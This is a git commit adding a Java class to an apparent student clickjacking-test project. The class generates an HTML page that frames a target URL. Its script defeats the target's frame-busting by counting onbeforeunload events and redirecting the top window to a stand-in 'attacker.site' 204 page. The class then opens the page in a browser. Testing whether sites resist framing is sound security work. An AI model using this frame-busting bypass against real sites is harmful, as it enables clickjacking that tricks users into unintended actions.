881062c3925f62576e1249f9afa2b7a1cea261e5
antoniosicuranza <a.sicuranza5@studenti.unisa.it>
2021-05-14 12:01:39 +0200

    Implementation of the "onBeforeUnload Event" method
    The "onBeforeUnload Event" method has been implemented for all browsers
    without the need for user interaction

---
+++ ClickjackingTest/src/main/java/com/dependability/clickjacking/creation/onBeforeUnloadEvent/OnBeforeUnloadEvent.java
@@ -0,0 +1,70 @@
+package com.dependability.clickjacking.creation.onBeforeUnloadEvent;
+
+import java.awt.Desktop;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+
+import com.dependability.clickjacking.clickInterface.ClickJacking;
+
+public class OnBeforeUnloadEvent implements ClickJacking{
+
+	private String src;
+	private File f;
+	
+	public OnBeforeUnloadEvent(String src){
+		this.src = src;
+		f = new File("src\\main\\webapp\\onBeforeUnloadEvent.html");
+	}
+	
+	@Override
+	public String getSrc() {
+		return src;
+	}
+	
+	@Override
+	public void setSrc(String src) {
+		this.src = src;
+		
+	}
+	
+	@Override
+	public File getHtmlFile() {
+		return f;
+	}
+	
+	@Override
+	public void setHtmlFile(File f) {
+		this.f = f;
+	}
+	
+	
+	@Override
+	public void creation() throws IOException {
+        BufferedWriter bw = new BufferedWriter(new FileWriter(f));
+        bw.write("<html><body>");
+        bw.write("<script>\r\n"
+        		+ "		    var prevent_bust = 0;\r\n"
+        		+ "		    window.onbeforeunload = function() {\r\n"
+        		+ "		        prevent_bust++;\r\n"
+        		+ "		    };\r\n"
+        		+ "		    setInterval(\r\n"
+        		+ "		        function() {\r\n"
+        		+ "		            if (prevent_bust > 0) {\r\n"
+        		+ "		                prevent_bust -= 2;\r\n"
+        		+ "		                window.top.location = \"http://attacker.site/204.php\";\r\n"
+        		+ "		            }\r\n"
+        		+ "		        }, 1);\r\n"
+        		+ "		</script>");
+	    bw.write("<iframe src="+src+"></iframe>");
+        bw.write("</body></html>");
+        bw.close();		
+	}
+	
+	@Override
+	public void run() throws IOException {
+		Desktop.getDesktop().browse(f.toURI());
+	}
+}
+
